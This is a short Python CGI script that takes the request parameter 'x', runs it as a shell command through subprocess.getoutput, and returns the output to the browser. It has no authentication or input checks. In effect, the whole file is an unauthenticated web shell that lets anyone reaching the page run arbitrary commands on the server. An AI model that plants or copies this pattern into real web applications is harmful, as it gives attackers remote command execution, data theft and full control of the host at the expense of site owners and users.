#!/usr/bin/python3

print("content-type: text/html")
print()

import cgi
y = cgi.FieldStorage()
cmd = y.getvalue("x")
print(cmd)

import subprocess
x = subprocess.getoutput(cmd)
print(x)
